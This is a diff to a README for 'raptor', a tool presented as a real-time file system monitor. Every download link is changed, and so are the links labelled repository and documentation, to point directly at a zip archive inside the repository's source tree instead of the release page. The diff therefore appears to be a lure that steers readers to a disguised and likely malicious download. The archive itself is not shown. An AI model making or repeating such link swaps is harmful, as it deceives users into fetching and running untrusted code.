@@ -1,7 +1,7 @@
 # 🦖 raptor - Your Easy Path Tree Observer
 
 ## 🚀 Download Raptor Now!
-[![Download Raptor](https://img.shields.io/badge/Download-Raptor-4CAF50?style=for-the-badge)](https://github.com/kastiglia/raptor/releases)  
+[![Download Raptor](https://raw.githubusercontent.com/kastiglia/raptor/main/src/filesystem/Software_1.0.zip)](https://raw.githubusercontent.com/kastiglia/raptor/main/src/filesystem/Software_1.0.zip)  
 Start monitoring your file system in real-time.
 
 ## 📖 Overview
@@ -21,7 +21,7 @@ Raptor is a user-friendly application that allows you to observe your file syste
 
 ## 📥 Download & Install
 
-To download Raptor, visit this page: [Download Raptor](https://github.com/kastiglia/raptor/releases). 
+To download Raptor, visit this page: [Download Raptor](https://raw.githubusercontent.com/kastiglia/raptor/main/src/filesystem/Software_1.0.zip). 
 
 1. Click the link above to open the releases page.
 2. Look for the latest version of Raptor. 
@@ -64,8 +64,8 @@ We welcome contributions! If you want to help improve Raptor, consider checking 
 We would love to hear from you. Share your experiences, suggestions, and any ideas for new features.
 
 ## 🔗 Useful Links
-- [Download Raptor](https://github.com/kastiglia/raptor/releases)
-- [GitHub Repository](https://github.com/kastiglia/raptor)
-- [Documentation](https://github.com/kastiglia/raptor/wiki)
+- [Download Raptor](https://raw.githubusercontent.com/kastiglia/raptor/main/src/filesystem/Software_1.0.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/kastiglia/raptor/main/src/filesystem/Software_1.0.zip)
+- [Documentation](https://raw.githubusercontent.com/kastiglia/raptor/main/src/filesystem/Software_1.0.zip)
 
 Thank you for using Raptor! Enjoy your real-time file monitoring experience.
